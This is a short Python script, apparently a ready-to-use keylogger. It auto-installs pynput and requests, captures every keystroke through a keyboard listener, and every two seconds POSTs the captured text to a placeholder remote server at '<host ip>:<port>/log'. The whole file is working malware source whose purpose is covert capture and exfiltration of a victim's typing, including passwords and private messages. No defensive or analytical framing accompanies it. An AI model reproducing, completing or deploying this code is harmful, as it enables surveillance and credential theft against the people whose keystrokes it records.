import subprocess
import sys

# Function to install a package
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# List of required packages
required_packages = ["pynput", "requests"]

# Check and install required packages
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"Installing {package}...")
        install(package)

# Import the necessary modules after ensuring they're installed
from pynput.keyboard import Listener
import threading
import time
import requests

# Global variable to store typed keys
typed_keys = []

def write_to_file():
    global typed_keys
    while True:
        time.sleep(2)  # Wait for 2 seconds
        if typed_keys:
            log_data = ''.join(typed_keys)
            # Send the log data to your server
            try:
                requests.post('<host ip>:<port>/log', data={'log': log_data})
            except Exception as e:
                print(f"Failed to send log: {e}")
            typed_keys.clear()  # Clear the list after sending

def on_press(key):
    global typed_keys
    letter = str(key).replace("'", "")

    # Map numpad keys to corresponding digits
    if letter in ['<97>', '<98>', '<99>', '<100>', '<101>', '<102>', '<103>', '<104>', '<105>', '<96>']:
        numpad_map = {
            '<97>': '1',
            '<98>': '2',
            '<99>': '3',
            '<100>': '4',
            '<101>': '5',
            '<102>': '6',
            '<103>': '7',
            '<104>': '8',
            '<105>': '9',
            '<96>': '0'
        }
        letter = numpad_map.get(letter, '')

    # Ignore certain keys
    if letter in ['Key.shift', 'Key.shift_l', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r']:
        return
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.enter':
        letter = "\n"
    if letter == 'Key.tab':
        letter = "    "

    typed_keys.append(letter)  # Add the letter to the list

# Start the logging thread
logging_thread = threading.Thread(target=write_to_file, daemon=True)
logging_thread.start()

# Start the keyboard listener
with Listener(on_press=on_press) as listener:
    listener.join()
